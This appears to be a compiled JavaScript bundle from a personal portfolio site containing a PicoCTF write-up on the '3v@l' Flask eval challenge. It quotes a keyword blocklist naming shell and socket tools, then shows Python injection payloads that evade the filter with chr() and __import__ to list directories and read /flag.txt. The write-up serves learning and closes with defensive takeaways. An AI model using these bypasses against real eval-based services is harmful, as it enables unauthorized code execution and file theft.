(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,64529,e=>{"use strict";var r=e.i(43476),t=e.i(22016);let a={cybersecurity:[{href:"/projects/cybersecurity/ssti1",title:"PicoCTF: SSTI1"},{href:"/projects/cybersecurity/nosql-injection",title:"PicoCTF: No Sql Injection"},{href:"/projects/cybersecurity/eval",title:"PicoCTF: 3v@l"},{href:"/projects/cybersecurity/soap",title:"PicoCTF: SOAP"},{href:"/projects/cybersecurity/macsync-stealer",title:"MacSync Stealer"},{href:"/projects/cybersecurity/cupid-portal",title:"HTCOTB2026 CTF: Cupid's Secret Message"},{href:"/projects/cybersecurity/heartmail",title:"HTCOTB2026 CTF: HeartMail 1.0"},{href:"/projects/cybersecurity/wicys-ctf-01",title:"WiCyS CTF: Bunny Tracker Glitch"},{href:"/projects/cybersecurity/wicys-ctf-02",title:"WiCyS CTF: Luck Checker"},{href:"/projects/cybersecurity/wicys-ctf-03",title:"WiCyS CTF: Bunny Network - Portal Override"},{href:"/projects/cybersecurity/wicys-ctf-04",title:"WiCyS CTF: Bunny Overflow"},{href:"/projects/cybersecurity/wicys-ctf-05",title:"WiCyS CTF: Rainbow Vault Overflow"},{href:"/projects/cybersecurity/wicys-ctf-06",title:"WiCyS CTF: ROP Around the Rainbow"},{href:"/projects/cybersecurity/wicys-ctf-07",title:"WiCyS CTF: Scavenger Hunt"},{href:"/projects/cybersecurity/wicys-ctf-08",title:"WiCyS CTF: Bunny Network API Override"},{href:"/projects/cybersecurity/wicys-ctf-09",title:"WiCyS CTF: Leprechauns Vault"}],"game-dev":[{href:"/projects/game-dev/my-first-game",title:"My First Game"},{href:"/projects/game-dev/ufo",title:"UFO"},{href:"/projects/game-dev/tank-game",title:"Tank Game"},{href:"/projects/game-dev/3d-game",title:"3D Game Engine"},{href:"/projects/game-dev/blackhole-simulator",title:"Blackhole Simulator"}],music:[{href:"/projects/music/blind-justice-investigation",title:"BL1ND JUST1C3: 1NV3ST1G4T1ON"},{href:"/projects/music/beethoven-virus",title:"Beethoven Virus"},{href:"/projects/music/the-longest-moment",title:"The Longest Moment Before a New Beginning"}],auto:[{href:"/projects/auto/tacoma-valve-cover",title:"Valve Cover Replacement & Modification (2002 Toyota Tacoma)"},{href:"/projects/auto/transmission-rebuild",title:"Manual Transmission Rebuild (1989 Honda Accord)"}],engineering:[{href:"/projects/engineering/rc-car",title:"Remote Control Car"}]};function s({category:e,currentPath:s}){let i=a[e],o=i.findIndex(e=>e.href===s);if(-1===o)return null;let n=i[o-1],l=i[o+1],c="group rounded-2xl border border-gray-200 bg-gray-85 px-5 py-4 transition-colors hover:border-blue-400 hover:bg-blue-50 dark:border-gray-800 dark:bg-gray-900 dark:hover:border-blue-500 dark:hover:bg-blue-950/30",d="rounded-2xl border border-dashed border-gray-200 bg-gray-50/70 px-5 py-4 opacity-60 dark:border-gray-800 dark:bg-gray-900/70",m="text-xs font-semibold uppercase tracking-[0.18em] text-gray-500 dark:text-gray-400",h="mt-2 text-base font-semibold text-gray-900 transition-colors group-hover:text-blue-700 dark:text-gray-100 dark:group-hover:text-blue-300",u="mt-2 text-base font-semibold text-gray-500 dark:text-gray-400";return(0,r.jsxs)("nav",{"aria-label":"Project navigation",className:"mt-12 grid w-full max-w-4xl grid-cols-1 gap-6 md:grid-cols-2",children:[l?(0,r.jsxs)(t.default,{href:l.href,className:c,children:[(0,r.jsx)("p",{className:m,children:"← Next Project"}),(0,r.jsx)("p",{className:h,children:l.title})]}):(0,r.jsxs)("div",{className:d,children:[(0,r.jsx)("p",{className:m,children:"← Next Project"}),(0,r.jsx)("p",{className:u,children:"End of category"})]}),n?(0,r.jsxs)(t.default,{href:n.href,className:`${c} text-right`,children:[(0,r.jsx)("p",{className:m,children:"Previous Project →"}),(0,r.jsx)("p",{className:h,children:n.title})]}):(0,r.jsxs)("div",{className:`${d} text-right`,children:[(0,r.jsx)("p",{className:m,children:"Previous Project →"}),(0,r.jsx)("p",{className:u,children:"Start of category"})]})]})}e.s(["default",()=>s],64529)},77509,e=>{"use strict";var r=e.i(43476),t=e.i(22016),a=e.i(64529);let s=`
  :root {
    --wu-border: #e5e7eb;
    --wu-muted: #6b7280;
    --wu-accent: #2563eb;
    --wu-bg-alt: #f9fafb;
  }

  .dark {
    --wu-border: #1f2937;
    --wu-muted: #9ca3af;
    --wu-accent: #3b82f6;
    --wu-bg-alt: #111827;
  }

  .page-wrap { box-sizing: border-box; }

  .page-wrap {
    position: relative;
    z-index: 1;
    max-width: 860px;
    margin: 0 auto;
    padding: 3rem 1.5rem 6rem;
    color: var(--foreground);
    font-family: inherit;
  }

  .back-link {
    display: inline-block;
    margin-bottom: 2rem;
    color: var(--wu-muted);
    text-decoration: none;
    font-size: 0.875rem;
    transition: color 0.2s ease;
  }
  .back-link:hover {
    color: var(--wu-accent);
  }

  .page-wrap header {
    border-bottom: 1px solid var(--wu-border);
    padding-bottom: 2rem;
    margin-bottom: 3rem;
  }

  .ctf-label {
    font-size: 0.75rem;
    letter-spacing: 0.2em;
    color: var(--wu-muted);
    text-transform: uppercase;
    font-weight: 600;
    margin-bottom: 0.5rem;
  }

  .page-wrap header h1 {
    font-size: clamp(2.25rem, 5vw, 3rem);
    font-weight: 800;
    line-height: 1.1;
    margin-bottom: 1.2rem;
    letter-spacing: -0.025em;
  }

  .meta-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 0.6rem 1.4rem;
    font-size: 0.875rem;
  }

  .meta-item {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    color: var(--wu-muted);
  }

  .meta-item span.val {
    color: var(--foreground);
    font-weight: 500;
  }

  .badge {
    display: inline-block;
    font-size: 0.75rem;
    font-weight: 700;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    background: none !important;
    border: none !important;
    padding: 0 !important;
  }
  .badge.diff-easy   { color: #70ff50; }
  .badge.diff-medium { color: #ffcc00; }
  .badge.diff-hard   { color: #ff6680; }

  section {
    margin-bottom: 2.8rem;
  }

  .section-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    margin-bottom: 1.2rem;
  }

  .section-num {
    font-size: 0.875rem;
    color: var(--wu-accent);
    font-weight: 700;
    opacity: 0.8;
  }

  h2 {
    font-size: 1.25rem;
    font-weight: 700;
    letter-spacing: -0.01em;
  }

  .section-line {
    flex: 1;
    height: 1px;
    background: var(--wu-border);
  }

  .card {
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    padding: 1.5rem;
    margin-bottom: 1.5rem;
    border-radius: 0.75rem;
  }

  .card h3 {
    font-size: 1.125rem;
    font-weight: 700;
    margin-bottom: 0.75rem;
  }

  .card ul {
    list-style: none;
    padding: 0;
  }

  .card ul li {
    padding: 0.25rem 0 0.25rem 1.25rem;
    position: relative;
    color: var(--foreground);
    font-size: 1rem;
  }

  .card ul li::before {
    content: "•";
    position: absolute;
    left: 0;
    color: var(--wu-accent);
    font-weight: bold;
  }

  .step {
    border: 1px solid var(--wu-border);
    border-radius: 0.75rem;
    margin-bottom: 1.25rem;
    overflow: hidden;
    background: var(--background);
  }

  .step-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    padding: 0.75rem 1.25rem;
    border-bottom: 1px solid var(--wu-border);
    background: var(--wu-bg-alt);
  }

  .step-num {
    font-size: 0.875rem;
    font-weight: 700;
    color: var(--wu-muted);
    min-width: 2.5rem;
  }

  .step-label {
    font-size: 1rem;
    font-weight: 600;
    color: var(--foreground);
    flex: 1;
  }

  .step-body {
    padding: 1.25rem;
  }

  .io-row {
    display: grid;
    grid-template-columns: 80px 1fr;
    gap: 0.4rem 0.8rem;
    margin-bottom: 1rem;
    align-items: start;
  }

  .io-label {
    font-size: 0.75rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    padding-top: 0.35rem;
  }

  .io-label.in  { color: var(--wu-accent);  }
  .io-label.out { color: #10b981; }

  code {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    font-size: 0.9rem;
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    padding: 0.75rem 1rem;
    display: block;
    border-radius: 0.5rem;
    color: var(--foreground);
    word-break: break-all;
    white-space: pre-wrap;
    line-height: 1.5;
  }

  code.inline-code {
    display: inline;
    padding: 0.2rem 0.4rem;
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    border-radius: 0.375rem;
    color: var(--wu-accent);
    font-size: 0.875em;
  }

  .reason {
    font-size: 1rem;
    color: var(--wu-muted);
    margin-top: 0.75rem;
    padding-top: 0.75rem;
    border-top: 1px dashed var(--wu-border);
    line-height: 1.6;
  }

  .prose {
    font-size: 1.1rem;
    color: var(--foreground);
    line-height: 1.75;
    margin-bottom: 1.25rem;
    opacity: 0.9;
  }

  .notice-box {
    border: 1px solid var(--wu-border);
    padding: 1.25rem;
    margin-bottom: 1.5rem;
    border-radius: 0.75rem;
    background: var(--wu-bg-alt);
    font-size: 0.95rem;
    font-style: italic;
  }

  .flag-box {
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    border-radius: 0.75rem;
    padding: 1.25rem;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.5rem;
  }

  .flag-label {
    font-size: 0.75rem;
    letter-spacing: 0.15em;
    color: var(--wu-muted);
    text-transform: uppercase;
    font-weight: 700;
  }

  .flag-value {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    font-size: 1rem;
    font-weight: 600;
    color: var(--wu-accent);
    word-break: break-all;
    text-align: center;
    padding: 0.5rem 1rem;
    background: var(--background);
    border: 1px solid var(--wu-border);
    border-radius: 0.5rem;
    width: 100%;
    max-width: 500px;
  }

  .tags {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
    margin-top: 1rem;
  }

  .tag {
    font-size: 0.75rem;
    font-weight: 500;
    padding: 0.25rem 0.75rem;
    border: 1px solid var(--wu-border);
    color: var(--wu-muted);
    border-radius: 9999px;
    background: var(--wu-bg-alt);
  }

  
`;function i({data:e,currentPath:i}){let o=e=>e.split(/(`[^`]+`)/g).map((e,t)=>e.startsWith("`")&&e.endsWith("`")?(0,r.jsx)("code",{className:"inline-code",children:e.slice(1,-1)},t):(0,r.jsx)("span",{dangerouslySetInnerHTML:{__html:e}},t));return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("style",{children:s}),(0,r.jsxs)("div",{className:"page-wrap",children:[(0,r.jsx)(t.default,{href:"/projects/cybersecurity",className:"back-link",children:"← Back to Cybersecurity Projects"}),(0,r.jsxs)("header",{children:[(0,r.jsx)("div",{className:"ctf-label",children:e.customLabel||"PicoCTF — Write-Up"}),(0,r.jsx)("h1",{children:e.title}),(0,r.jsxs)("div",{className:"meta-grid",children:[e.category&&(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Category:"}),(0,r.jsx)("span",{className:"val",children:e.category})]}),e.points&&(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Points:"}),(0,r.jsx)("span",{className:"val",children:e.points})]}),(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Author:"}),(0,r.jsx)("span",{className:"val",children:e.author})]}),e.difficulty&&(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Difficulty:"}),(0,r.jsx)("span",{className:`badge diff-${e.difficulty}`,children:e.difficulty.charAt(0).toUpperCase()+e.difficulty.slice(1)})]})]}),(0,r.jsx)("div",{className:"tags",children:e.tags.map(e=>(0,r.jsxs)("span",{className:"tag",children:["#",e]},e))})]}),e.sections.map((e,t)=>(0,r.jsxs)("section",{children:[(0,r.jsxs)("div",{className:"section-header",children:[(0,r.jsx)("span",{className:"section-num",children:String(t+1).padStart(2,"0")}),(0,r.jsx)("h2",{children:e.title}),(0,r.jsx)("div",{className:"section-line"})]}),e.prose&&(0,r.jsx)("p",{className:"prose",children:o(e.prose)}),e.notice&&(0,r.jsx)("div",{className:"notice-box",children:o(e.notice)}),e.cards?.map((e,t)=>(0,r.jsxs)("div",{className:"card",children:[(0,r.jsx)("h3",{children:e.title}),(0,r.jsx)("ul",{children:e.items.map((e,t)=>(0,r.jsx)("li",{children:o(e)},t))})]},t)),e.steps?.map((e,t)=>(0,r.jsxs)("div",{className:"step",children:[(0,r.jsxs)("div",{className:"step-header",children:[(0,r.jsxs)("span",{className:"step-num",children:["STEP ",e.number]}),(0,r.jsx)("span",{className:"step-label",children:e.label})]}),(0,r.jsxs)("div",{className:"step-body",children:[e.prose&&(0,r.jsx)(r.Fragment,{children:e.prose.split("\n\n").map((e,t)=>(0,r.jsx)("p",{className:"prose",children:o(e)},t))}),e.notice&&(0,r.jsx)("div",{className:"notice-box",children:o(e.notice)}),e.input&&(0,r.jsxs)("div",{className:"io-row",children:[(0,r.jsx)("span",{className:"io-label in",children:"INPUT"}),(0,r.jsx)("code",{children:e.input})]}),e.output&&(0,r.jsxs)("div",{className:"io-row",children:[(0,r.jsx)("span",{className:"io-label out",children:"OUTPUT"}),(0,r.jsx)("code",{className:"output",children:e.output})]}),e.reason&&(0,r.jsx)("p",{className:"reason",children:o(e.reason)})]})]},t))]},t)),e.flag&&(0,r.jsxs)("section",{children:[(0,r.jsxs)("div",{className:"section-header",children:[(0,r.jsx)("span",{className:"section-num",children:"FF"}),(0,r.jsx)("h2",{children:"Flag"}),(0,r.jsx)("div",{className:"section-line"})]}),(0,r.jsxs)("div",{className:"flag-box",children:[(0,r.jsx)("div",{className:"flag-label",children:"Captured Flag"}),(0,r.jsx)("div",{className:"flag-value",children:e.flag})]})]}),(0,r.jsxs)("footer",{children:[(0,r.jsxs)("span",{children:[e.author," — ",e.customLabel||"PicoCTF Write-Up"]}),(0,r.jsx)("span",{children:"All steps performed in a legal environment."})]}),(0,r.jsx)(a.default,{category:"cybersecurity",currentPath:i})]})]})}e.s(["default",()=>i])},57903,e=>{"use strict";var r=e.i(43476),t=e.i(77509);function a(){let e={title:"3v@l",category:"Web Exploitation",points:"n/a",author:"Kelvin Creighton",difficulty:"medium",tags:["web","eval","python","flask","rce"],flag:"picoCTF{...}",sections:[{title:"Research",cards:[{title:"Why eval is dangerous?",items:["Executes a string as code.","What more is to be said honestly. (at least for this challenge)"]}]},{title:"Information Gathering",prose:"Taking a look at the HTML in the Inspector section in the Developer Tools we find this hint:",notice:"TODO\n------------\nSecure python_flask eval execution by \n    1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind\n    2.Implementing regex: r'0x[0-9A-Fa-f]+|\\\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.'",steps:[{number:"01",label:"Breaking Down the Regex",prose:"If we break down the regex, which has many parts split by the | (or) operator, we can see what it will and will not match with:\n\n- `0x[0-9A-Fa-f]+`: One or more hexadecimal digits (0–9, A–F, a–f).\n- `\\\\u[0-9A-Fa-f]{4}`: Literally \\u (the regex has \\\\u so it matches one backslash + u). Exactly four hex digits.\n- `%[0-9A-Fa-f]{2}`: Literally %. Exactly two hex digits.\n- `\\.[A-Za-z0-9]{1,3}\\b`: Literal dot. 1 to 3 alphanumeric characters. Word boundary.\n- `[\\\\\\/]`: Matches either a backslash \\ or a forward slash /.\n- `\\.\\.`: Matches .. (two dots)."},{number:"02",label:"Analyzing Matches vs Non-Matches",prose:"Examples of what Matches and Doesn't Match:\n\n- Hex literal: Matches `0xFF`, Doesn't Match `0x`\n- Unicode escape: Matches `\\u0041`, Doesn't Match `\\u123`\n- Percent encoding: Matches `%20`, Doesn't Match `%2`\n- File extension: Matches `.js`, Doesn't Match `.webp`\n- Double dot: Matches `..`, Doesn't Match `...`\n\nNotice that underscores are also not blacklisted. This will come in handy later..."}]},{title:"Creating the Payload",prose:"We know we can't use the `ls` command. However, there may still be a way to run a 'list directories' using `os.listdir()`. The problem is that the keyword `os` is also blacklisted.",steps:[{number:"01",label:"Bypassing the Keyword Blacklist",input:"chr(111)+chr(115)",output:"os",reason:"<strong>Reason:</strong> A trick we can use is through the `chr()` function to evaluate the letters. This outputs `os`, but it is still just a string object."},{number:"02",label:"Importing the `os` Module",input:"__import__(chr(111)+chr(115)).listdir()",output:"['app.py', 'static', 'templates']",reason:"<strong>Reason:</strong> This is equivalent to `__import__('os').listdir()`. It allows us to list the current directory contents."},{number:"03",label:"Exploring the Root Directory",input:"__import__(chr(111)+chr(115)).listdir(chr(47))",output:"['flag.txt', ...]",reason:"<strong>Reason:</strong> Now we dig around and find the `flag.txt` file in the `/` directory. We use `chr(47)` to represent the forward slash `/` since it's blacklisted by the regex."},{number:"04",label:"Reading the Flag",input:"open(chr(47)+'flag.'+chr(116)+'xt').read()",output:"[Flag Content]",reason:"<strong>Reason:</strong> We need to open and read the file. But remember we are restricted with the regex (`/` is blacklisted along with any 1-3 letters after a dot). So instead we use `chr()` again to thwart the regex blacklist. A more robust solution would be `__import__('builtins').open(chr(47)+'flag.'+chr(116)+'xt').read()`."}]},{title:"Key Takeaways",cards:[{title:"",items:["Do not use `eval()` on user-supplied input. It leads to Remote Code Execution.","Blacklists and regex filters are often insufficient to prevent code execution because attackers can obfuscate or build the payloads using built-in functions like `chr()` and dynamic imports."]}]}]};return(0,r.jsx)(t.default,{data:e,currentPath:"/projects/cybersecurity/eval"})}e.s(["default",()=>a])}]);